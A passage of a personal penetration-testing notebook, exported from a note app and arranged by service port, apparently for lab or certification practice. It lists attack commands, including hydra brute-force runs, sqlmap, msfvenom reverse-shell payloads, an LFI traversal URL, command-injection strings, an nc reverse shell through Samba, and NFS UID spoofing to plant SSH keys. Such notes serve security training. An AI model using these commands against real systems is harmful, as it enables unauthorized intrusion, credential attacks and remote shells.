        <rich_text background="#000000000000">

cat /etc/crontab
ls /etc/cron.*


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Bob is a user on this machine. What is every single file he has ever created?</rich_text>
        <rich_text background="#000000000000">

find / -user miguel 2&gt;/dev/null


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Any mail? mbox in User $HOME directory?</rich_text>
        <rich_text background="#000000000000">

cd /var/mail/
ls -lsaht

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Linpease:</rich_text>
        <rich_text background="#000000000000">
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Traitor:</rich_text>
        <rich_text background="#000000000000">
https://github.com/liamg/traitor

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">GTFOBins:</rich_text>
        <rich_text background="#000000000000">
https://gtfobins.github.io/

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">PSpy32/Pspy64:</rich_text>
        <rich_text background="#000000000000">
https://github.com/DominicBreuker/pspy/blob/master/README.md</rich_text>
      </node>
    </node>
  </node>
  <node unique_id="275" master_id="0" name="Stuck Help" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706584679" ts_lastsave="1706584680">
    <rich_text weight="heavy">Things to consider</rich_text>
    <rich_text>
☐ Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
☐ Is there a service that will allow you to enumerate something useful (i.e. usernames) but maybe doesn't make that obvious (e.g. RID brute-force through SMB with crackmapexec or lookupsid.py)?
☐ Have you used the best wordlist possible for your tasks (is there a better/bigger directory list? Is there a SecLists cred list for this service?)
☐ Have you fuzzed the directories you have found for a) more directories, or b) common filetypes -x php,pl,sh,etc
☐ Have you tried some manual testing (MySQL, wireshark inspections)
☐ Have you collected all the hashes</rich_text>
    <rich_text weight="heavy"> and cracked them</rich_text>
    <rich_text>?
☐ Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
☐ Do the version numbers tell you anything about the host?
☐ Have you tried bruteforce (cewl, patator)?
☐ Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
☐ Do you need to relax some of the terms used for searching? Instead of v2.8 maybe we check for anything under 3.
☐ Do you need a break?
</rich_text>
  </node>
  <node unique_id="274" master_id="0" name="Kali Commands" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706584661" ts_lastsave="1706584664">
    <rich_text>Update One-Liner:
		sudo apt update &amp;&amp; sudo apt upgrade -y &amp;&amp; sudo apt dist-upgrade -y &amp;&amp; sudo apt autoremove -y

Install individual packages: 
	sudo apt install [application]
	
</rich_text>
  </node>
  <node unique_id="273" master_id="0" name="Web App Hacking" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1705977854" ts_lastsave="1706130553">
    <rich_text>session cookie 

</rich_text>
    <rich_text family="monospace">kali@kali:~$ gobuster -c "session=.eJyrVkosLclIzSvJTE4sSU1RsiopKk3VUSrKz0lVslIqSCzJBMop6SiVFqcWxaflJeaChEPyc2FCmUAthoYmpua1ANrYGQk.ZOZoxg.vwkkN3cbMwI52tj8EK2dWDJ7a9o"  dir -b 400,404,302,500 --wordlist /home/kali/integers.txt --url </rich_text>
    <rich_text family="monospace" link="webs https://hospital.local/patients/home">https://hospital.local/patients/home</rich_text>
    <rich_text>

sudo -l 

</rich_text>
  </node>
  <node unique_id="65" master_id="0" name="Basic Methodology" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670960534" ts_lastsave="1704237786">
    <node unique_id="84" master_id="0" name="PORT 21 (FTP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670964858">
      <rich_text background="#000000000000">--</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Anonymous Login/Password Reuse</rich_text>
      <rich_text background="#000000000000">

$ ftp &lt;IP address&gt;
OR
FileZilla GUI
OR
</rich_text>
      <rich_text link="webs ftp://" background="#000000000000">ftp://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;
OR
$ telnet &lt;IP address&gt;

Username: ftp Password: ftp
Username: anonymous Password: anonymous


--</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Get/Put files</rich_text>
      <rich_text background="#000000000000">

ftp&gt; get file.txt
ftp&gt; put shell.aspx


--</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">

$ ls -la /usr/share/nmap/scripts | grep "ftp"


--</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">

$ hydra -l root -P password-file.txt &lt;IP address&gt; ftp
OR
$ hydra -l root -P /usr/share/wordlists/rockyou.txt </rich_text>
      <rich_text link="webs ftp://" background="#000000000000">ftp://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;
OR
Sparta GUI</rich_text>
    </node>
    <node unique_id="86" master_id="0" name="PORT 22 (SSH)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1705251393">
      <rich_text background="#000000000000" foreground="#ffff00000000">Password Reuse</rich_text>
      <rich_text background="#000000000000">
$ ssh &lt;username&gt;@&lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SSH Private Key Login</rich_text>
      <rich_text background="#000000000000">
$ chmod 600 private-key.txt
$ ssh -i private-key.txt &lt;username&gt;@&lt;IP address&gt;



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "ssh"





</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">
$ hydra -l root -P password-file.txt &lt;IP address&gt; ssh
</rich_text>
      <rich_text>

Clear known_hosts 
rm ~/.ssh/known_hosts
ssh -p 2222 -i fileup root@mountaindesserts.com
yes</rich_text>
    </node>
    <node unique_id="85" master_id="0" name="PORT 25 (SMTP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670965015">
      <rich_text background="#000000000000" foreground="#ffff00000000">Enumerate Users</rich_text>
      <rich_text background="#000000000000">

$ for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 &lt;IP address&gt; 25 2&gt;/dev/null | grep ^"250"; done
OR
$ smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t &lt;IP address&gt;
OR
$ smtp-user-enum.pl -M EXPN -U /usr/share/wordlists/metasploit/unix_users.txt -t &lt;IP address&gt;



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">

$ ls -la /usr/share/nmap/scripts | grep "smtp"

</rich_text>
    </node>
    <node unique_id="92" master_id="0" name="PORT 53 (DNS)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670965133">
      <rich_text background="#000000000000" foreground="#ffff00000000">DNS Lookup</rich_text>
      <rich_text background="#000000000000">
$ host &lt;IP address/Domain Name&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DNS Name Servers</rich_text>
      <rich_text background="#000000000000">
$ host -t ns &lt;Domain Name&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DNS Mail Servers</rich_text>
      <rich_text background="#000000000000">
$ host -t mx &lt;Domain Name&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DNS Zone Transfer</rich_text>
      <rich_text background="#000000000000">
$ host -l &lt;Domain Name&gt; &lt;DNS server name/IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DNSRecon</rich_text>
      <rich_text background="#000000000000">
$ dnsrecon -d &lt;Domain Name&gt; -t axfr


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DNSenum</rich_text>
      <rich_text background="#000000000000">
$ dnsenum &lt;Domain Name&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Add hostname to /etc/hosts file</rich_text>
      <rich_text background="#000000000000">
$ gedit /etc/hosts
10.10.10.29 bank.corp


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "dns"</rich_text>
    </node>
    <node unique_id="70" master_id="0" name="PORT 69 (udp-TFTP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670965160">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect</rich_text>
      <rich_text background="#000000000000">

$ tftp &lt;IP address&gt;
OR
$ atftp &lt;ipaddress&gt;</rich_text>
    </node>
    <node unique_id="90" master_id="0" name="PORT 79 (FINGER)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670965215">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect</rich_text>
      <rich_text background="#000000000000">
$ tftp &lt;IP address&gt;
OR
$ atftp &lt;ipaddress&gt;

</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">User Guessing</rich_text>
      <rich_text background="#000000000000">
$ finger &lt;username&gt;@&lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">User Enumeration</rich_text>
      <rich_text background="#000000000000">
$ finger-user-enum.pl -U /usr/share/seclists/usernames/names -t &lt;IP address&gt;</rich_text>
    </node>
    <node unique_id="79" master_id="0" name="PORT 80, 443 (HTTP-HTTPS)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670965592">
      <rich_text background="#000000000000" foreground="#ffff00000000">Source Code</rich_text>
      <rich_text background="#000000000000">
Right-Click -&gt; View Page Source


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Check what request methods a server supports (look for PUT meaning you can upload files)</rich_text>
      <rich_text background="#000000000000">
$ curl -v -X OPTIONS &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Upload a file using curl</rich_text>
      <rich_text background="#000000000000">
$ curl </rich_text>
      <rich_text link="webs http://" background="#000000000000">http://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt; --upload-file test.txt


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Non-indexed Webpages</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text link="webs http://" background="#000000000000">http://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;/robots.txt


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Investigate the web server</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text link="webs http://" background="#000000000000">http://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;/index.html
</rich_text>
      <rich_text link="webs http://" background="#000000000000">http://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;/index.php


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Bust Directories</rich_text>
      <rich_text background="#000000000000">
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;IP address/URL&gt; -t 250 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html
OR
$ go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;IP address/URL&gt; -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html
OR
$ go run main.go -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;IP address/URL&gt; -p socks5://127.0.0.1:9050 -t 100 -s 302,307,200,204,301,403 -x sh,pl,txt,php,asp,jsp,aspx,py,do,html # Through a socks5 proxy
OR
Dirbuster GUI
OR
$ dirb &lt;IP address/URL&gt; -p socks4://127.0.0.1:9050 # Through a socks4 proxy


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">ShellShock Directories</rich_text>
      <rich_text background="#000000000000">
cgi-bin/user.sh
cgi-bin/test.cgi


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nikto</rich_text>
      <rich_text background="#000000000000">
$ nikto -h &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">WPScan</rich_text>
      <rich_text background="#000000000000">
$ wpscan --url &lt;WordPress URL&gt; -e u,ap
$ wpscan --url &lt;WordPress URL&gt; -e u,ap,at,cb,dbe


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Joomscan</rich_text>
      <rich_text background="#000000000000">
$ joomscan -u &lt;Joomla URL&gt; -ec


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SSLyze</rich_text>
      <rich_text background="#000000000000">
$ sslyze --regular &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SSLscan</rich_text>
      <rich_text background="#000000000000">
$ sslscan &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">DAVTest</rich_text>
      <rich_text background="#000000000000">
$ davtest -url </rich_text>
      <rich_text link="webs http://" background="#000000000000">http://</rich_text>
      <rich_text background="#000000000000">&lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Burp Suite</rich_text>
      <rich_text background="#000000000000">
Preferences -&gt; Advanced -&gt; Network -&gt; Connection Settings -&gt; Manual Proxy Configuration -&gt; Setup Firefox to use proxy 127.0.0.1:8080 -&gt; Turn Intercept to On in Burp -&gt; Right-Click a request and select 'Forward to Repeater'


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "http"



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Default Password</rich_text>
      <rich_text background="#000000000000">
Username: admin Password: admin
Check Google


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Command Execution</rich_text>
      <rich_text background="#000000000000">
127.0.0.1; uname -a
OR
127.0.0.1 &amp;&amp; uname -a
SQL Injection
' or 1=1 #


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SQLMAP</rich_text>
      <rich_text background="#000000000000">
$ sqlmap --url=&lt;IP address&gt; --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dbms=mysql --level=3 --risk=3
OR
$ sqlmap --data="search=OSINT" --url=</rich_text>
      <rich_text link="webs http://192.168.1.160/welcome.php" background="#000000000000">http://192.168.1.160/welcome.php</rich_text>
      <rich_text background="#000000000000"> --cookie="PHPSESSID=nce5aar41js59p2ber5es3mr2l" --dump
SQLMAP .req file (frpmBurpSuite)
Copy the entire request from Burp
$ vi login.req
Paste the entire request from Burp
$ sqlmap -r login.req


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">LFI/RFI</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text link="webs http://10.11.14.113/addguestbook.php?name=James&amp;comment=Hello&amp;LANG=../../../../../../../../../../etc/hosts" background="#000000000000">http://10.11.14.113/addguestbook.php?name=James&amp;comment=Hello&amp;LANG=../../../../../../../../../../etc/hosts</rich_text>
      <rich_text background="#000000000000">


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">PHP/ASP/ASPX/JSP/WAR Reverse Shell File Upload</rich_text>
      <rich_text background="#000000000000">
</rich_text>
      <rich_text link="webs http://pentestmonkey.net/tools/web-shells/php-reverse-shell" background="#000000000000">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</rich_text>
      <rich_text background="#000000000000">
Edit IP address and port

$ msfvenom -p php/reverse_php LHOST=&lt;IP address&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.php
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP address&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.php
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP address&gt; LPORT=&lt;Port&gt; -f asp &gt; shell.asp
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP address&gt; LPORT=&lt;Port&gt; -f aspx &gt; shell.aspx
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP Address&gt; LPORT=&lt;Port&gt; -f raw &gt; shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP Address&gt; LPORT=&lt;Port&gt; -f war &gt; shell.war


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Image Data</rich_text>
      <rich_text background="#000000000000">
$ exiftool &lt;image&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">
$ hydra -V -L usernames.txt -P passwords.txt 192.168.1.101 http-get-form '/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security;low;PHPSESSID=1ce2ba52deb9a642ed57a0d34d6c5dfe'
OR
$ hydra -l none -P rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+Inproc_login=true:Incorrect password" -t 64 -V
OR
$ wpscan --url </rich_text>
      <rich_text link="webs http://10.11.1.234/wp-login" background="#000000000000">http://10.11.1.234/wp-login</rich_text>
      <rich_text background="#000000000000"> -v -P ~/&lt;wordlist&gt; -U elliot -t 50</rich_text>
    </node>
    <node unique_id="77" master_id="0" name="PORT 88 (KERBEROS)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670978901">
      <rich_text background="#000000000000" foreground="#ffff00000000">Check MS14-068 (if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller)</rich_text>
      <rich_text>

</rich_text>
      <rich_text link="webs https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</rich_text>
    </node>
    <node unique_id="76" master_id="0" name="PORT 110 (POP3)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670978996">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect and login</rich_text>
      <rich_text background="#000000000000">

$ telnet &lt;IP address&gt; 110
USER admin
PASS admin


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Display emails</rich_text>
      <rich_text background="#000000000000">
LIST


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Retrieve email</rich_text>
      <rich_text background="#000000000000">
RETR 1


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "pop3"</rich_text>
    </node>
    <node unique_id="83" master_id="0" name="PORT 111 (RPC BIND)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670978991">
      <rich_text background="#000000000000" foreground="#ffff00000000">RPC Services</rich_text>
      <rich_text>

</rich_text>
      <rich_text background="#000000000000">$ rpcinfo -p &lt;IP address&gt;</rich_text>
    </node>
    <node unique_id="80" master_id="0" name="PORT 135 (MSRPC)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979033">
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE msrpc-enum script</rich_text>
      <rich_text>

$ nmap &lt;IP address&gt; --script=msrpc-enum



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Metasploit stack buffer overflow in the RPCSS service</rich_text>
      <rich_text>

msf &gt; use exploit/windows/dcerpc/ms03_026_dcom</rich_text>
    </node>
    <node unique_id="87" master_id="0" name="PORT 137, 139, 445 (SMB-SAMBA))" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1705977841">
      <rich_text background="#000000000000" foreground="#ffff00000000">Samba/SMB Version</rich_text>
      <rich_text background="#000000000000">

$ sudo ./smbver.sh &lt;IP address&gt; &lt;port&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Enum4linux</rich_text>
      <rich_text background="#000000000000">

$ enum4linux -a &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">NetBIOS Scan</rich_text>
      <rich_text background="#000000000000">

$ nbtscan &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Rpcclient Null Session</rich_text>
      <rich_text background="#000000000000">

$ rpcclient -U "" &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Smbclient Display Shares</rich_text>
      <rich_text background="#000000000000">

$ smbclient -L //&lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Smbclient Connect to a Share</rich_text>
      <rich_text background="#000000000000">

$ smbclient //&lt;IP address&gt;/&lt;share&gt;

smbmap -H 192.168.12.123 -u administrator -p asdf1234


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Command Execution</rich_text>
      <rich_text background="#000000000000">

smbmap  -u ariley -p 'P@$$w0rd1234!' -d ABC -x 'net group "Domain Admins" /domain' -H 192.168.2.50


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SMB Reverse Shell (backticks)</rich_text>
      <rich_text background="#000000000000">

smb: \&gt; logon "/=`nc &lt;Attacker IP address&gt; &lt;port&gt; -e /bin/sh`"


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">SMBMap Display Shares</rich_text>
      <rich_text background="#000000000000">

$ smbmap -H &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Psexec</rich_text>
      <rich_text background="#000000000000">

$ python psexec.py pentest:'P3nT3st!'@&lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">

$ ls -la /usr/share/nmap/scripts | grep "smb"
OR
$ ls -la /usr/share/nmap/scripts | grep "samba"


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Symlink Directory Traversal</rich_text>
      <rich_text background="#000000000000">

msf &gt; use auxiliary/admin/smb/samba_symlink_traversal


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">

$ hydra -l root -P password-file.txt &lt;IP address&gt; smb</rich_text>
    </node>
    <node unique_id="73" master_id="0" name="PORT 161 (udp-SNMP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979502">
      <rich_text background="#000000000000" foreground="#ffff00000000">Onesixtyone Community Strings (Create a community.txt with lines: public, private, manager)</rich_text>
      <rich_text background="#000000000000">
$ onesixtyone -c community.txt -i list_of_ips.txt


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Snmpwalk entire MIB tree</rich_text>
      <rich_text background="#000000000000">
$ snmpwalk -c &lt;community string&gt; -v1 &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Snmp-check</rich_text>
      <rich_text background="#000000000000">
$ snmp-check &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Snmpcheck</rich_text>
      <rich_text background="#000000000000">
$ snmpcheck -c &lt;community string&gt; -t &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "snmp"



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">
$ hydra -P password-file.txt &lt;IP address&gt; snmp</rich_text>
    </node>
    <node unique_id="78" master_id="0" name="PORT 389-636 (LSAP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979496">
      <rich_text background="#000000000000" foreground="#ffff00000000">Ldapsearch</rich_text>
      <rich_text>


</rich_text>
      <rich_text background="#000000000000">$ ldapsearch -h &lt;IP address&gt; -p 389 -x -b "dc=mywebsite,dc=com"</rich_text>
    </node>
    <node unique_id="74" master_id="0" name="PORT 512 (REXEC)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979543">
      <rich_text background="#000000000000" foreground="#ffff00000000">Rlogin (rsh-client)</rich_text>
      <rich_text background="#000000000000">
$ rlogin -l root &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">
Sparta GUI</rich_text>
    </node>
    <node unique_id="88" master_id="0" name="PORT 513 (RLOGIN)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979562">
      <rich_text background="#000000000000" foreground="#ffff00000000">Rlogin (rsh-client)</rich_text>
      <rich_text>
</rich_text>
      <rich_text background="#000000000000">$ rlogin -l root &lt;IP address&gt;</rich_text>
    </node>
    <node unique_id="82" master_id="0" name="PORT 514 (RSH)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979598">
      <rich_text background="#000000000000" foreground="#ffff00000000">Rlogin (rsh-client)</rich_text>
      <rich_text>
</rich_text>
      <rich_text background="#000000000000">$ rlogin -l root &lt;IP address&gt;</rich_text>
    </node>
    <node unique_id="71" master_id="0" name="PORT 1433 (MSSQL)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979636">
      <rich_text background="#000000000000" foreground="#ffff00000000">Password Reuse</rich_text>
      <rich_text background="#000000000000">
mssql-cli -S &lt;server URL&gt; -U &lt;username&gt; -P &lt;password&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Execute commands</rich_text>
      <rich_text background="#000000000000">
EXEC xp_cmdshell 'dir *.exe'; </rich_text>
    </node>
    <node unique_id="67" master_id="0" name="PORT 2049 (NFS)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979825">
      <rich_text background="#000000000000" foreground="#ffff00000000">NFS Server's All Mount Points List</rich_text>
      <rich_text background="#000000000000">
$ showmount -a 192.168.1.132


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">NFS Server's Directories List</rich_text>
      <rich_text background="#000000000000">
$ showmount -d 192.168.1.132


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">NFS Server's Export List</rich_text>
      <rich_text background="#000000000000">
$ showmount -e 192.168.1.132


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Export list for 192.168.1.132:</rich_text>
      <rich_text background="#000000000000">
/home/vulnix *


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Mount a remote directory</rich_text>
      <rich_text background="#000000000000">
$ mkdir -p /mnt/vulnix
$ mount -t nfs 192.168.1.132:/home/vulnix /mnt/vulnix

</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Check if you can create .ssh directory (if permission denied, that's okay, follow steps below)</rich_text>
      <rich_text background="#000000000000">
$ mkdir -p /mnt/vulnix/.ssh


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Create a fake vulnix account with a UID of 2008 on my machine (Kali Linux)</rich_text>
      <rich_text background="#000000000000">
# useradd -u 2008 vulnix


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Switch user to vulnix, and create a .ssh directory</rich_text>
      <rich_text background="#000000000000">
$ su vulnix
$ cd /mnt/vulnix
$ mkdir .ssh


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Switch user to root, and generate a SSH key pair (Kali Linux)</rich_text>
      <rich_text background="#000000000000">
$ su root
$ ssh-keygen
$ cat /root/.ssh/id_rsa.pub


</rich_text>
